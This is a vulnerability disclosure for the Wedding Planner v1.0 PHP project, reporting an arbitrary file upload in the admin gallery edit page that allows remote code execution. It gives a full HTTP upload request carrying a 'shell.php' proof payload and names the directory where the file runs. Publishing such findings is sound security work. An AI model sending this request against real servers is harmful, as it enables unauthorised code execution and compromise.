# Wedding Planner v1.0 by pushpam02 has arbitrary code execution (RCE)

BUG_Author: f0ward

vendor: https://www.sourcecodester.com/php/15375/wedding-planner-project-php-free-download.html

Vulnerability url: http://ip/Wedding-Management-PHP/admin/photos_edit.php?id=37

Loophole location：The editing function of "Gallery" module in the background management system-- > there is an arbitrary file upload vulnerability (RCE) in the picture upload point of "photos_edit.php" file.

Click "Edit" to save

Request package for file upload:

```sql
POST /Wedding-Management-PHP/admin/photos_edit.php?id=37 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/Wedding-Management-PHP/admin/photos_edit.php?id=37
Cookie: PHPSESSID=ncd6h7doujvbbft46r0m7mbr6s
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------143261442322250
Content-Length: 834

-----------------------------143261442322250
Content-Disposition: form-data; name="booking_id"

34
-----------------------------143261442322250
Content-Disposition: form-data; name="title"


-----------------------------143261442322250
Content-Disposition: form-data; name="caption"


-----------------------------143261442322250
Content-Disposition: form-data; name="alternate_text"


-----------------------------143261442322250
Content-Disposition: form-data; name="description"


-----------------------------143261442322250
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------143261442322250
Content-Disposition: form-data; name="submit"

Edit
-----------------------------143261442322250--
```

The files will be uploaded to this directory  \Wedding-Management-PHP\admin\upload\gallery

![image](https://user-images.githubusercontent.com/54017627/183274902-c067ed28-7ae2-4909-88da-a5d53eb5e5d1.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/183274917-ebff1508-433d-41ce-85db-90c3e194b8e6.png)

